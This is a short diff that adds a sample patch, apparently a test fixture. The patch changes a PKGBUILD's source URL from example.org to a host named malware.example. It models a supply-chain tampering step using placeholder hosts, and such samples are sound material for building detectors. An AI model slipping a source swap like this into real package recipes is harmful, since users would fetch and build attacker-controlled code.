@@ -1,0 +1,5 @@
+--- a/PKGBUILD
++++ b/PKGBUILD
+@@ -1,2 +1,2 @@
+-source=('https://example.org/x.tar.gz')
++source=('https://malware.example/x.tar.gz')
